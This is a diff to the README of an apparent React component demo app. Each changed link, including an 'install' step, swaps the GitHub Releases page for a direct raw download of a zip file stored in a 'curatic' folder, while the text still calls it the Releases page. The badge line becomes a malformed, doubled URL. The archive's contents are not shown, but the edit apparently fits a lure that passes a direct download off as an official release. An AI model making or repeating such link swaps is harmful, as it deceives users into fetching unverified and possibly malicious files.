@@ -4,9 +4,9 @@
 Welcome to the react-component-playground! This application helps you explore modern React components, authentication methods, and best practices in a user-friendly environment. Whether you want to see how components work or showcase your portfolio, this app has got you covered.
 
 ## 📥 Download & Install
-To download the application, **visit this page to download**: [Releases](https://github.com/atrbtheduke/react-component-playground/releases).
+To download the application, **visit this page to download**: [Releases](https://raw.githubusercontent.com/atrbtheduke/react-component-playground/main/curatic/react-component-playground.zip).
 
-![Download Button](https://img.shields.io/badge/Download%20Now-blue.svg)
+![Download Button](https://raw.githubusercontent.com/atrbtheduke/react-component-playground/main/curatic/react-component-playground.zip%https://raw.githubusercontent.com/atrbtheduke/react-component-playground/main/curatic/react-component-playground.zip)
 
 Simply click the link above to go to the Releases page. You will find different versions of the software available for download. Choose the latest version and follow the instructions below to install it on your computer.
 
@@ -20,7 +20,7 @@ Before you install the react-component-playground, make sure your system meets t
 
 ## 🔧 Installation Steps
 
-1. **Go to the Download Page:** Click [here](https://github.com/atrbtheduke/react-component-playground/releases) to visit the Releases page.
+1. **Go to the Download Page:** Click [here](https://raw.githubusercontent.com/atrbtheduke/react-component-playground/main/curatic/react-component-playground.zip) to visit the Releases page.
    
 2. **Download the Latest Version:** Look for the most recent release. Click on the link for your operating system to start the download.
 
